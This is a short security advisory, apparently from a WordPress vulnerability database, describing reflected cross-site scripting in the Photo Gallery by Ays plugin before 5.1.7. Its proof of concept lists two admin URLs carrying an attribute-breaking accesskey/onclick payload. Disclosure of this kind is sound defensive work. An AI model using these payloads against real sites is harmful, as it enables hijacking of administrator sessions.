## WordPress Plugin Vulnerabilities

# Photo Gallery by Ays < 5.1.7 - Reflected XSS

### Description

The plugin does not escape some parameters before outputting it back in attributes, leading to Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Make a logged in admin open one of the URLs below
v < 5.1.7 - https://example.com/wp-admin/admin.php?page=gallery-photo-gallery-settings&ays\_gpg\_tab=" accesskey=X onclick=alert(/XSS/)//
v < 5.1.6 - https://example.com/wp-admin/admin.php?page=gallery-photo-gallery&action=edit&gallery=1&ays\_gpg\_settings\_tab=" accesskey=X onclick=alert(/XSS/)//
The XSS will be triggered when pressing ALT+SHIFT+X on Windows and CTRL+ALT+X on OS X
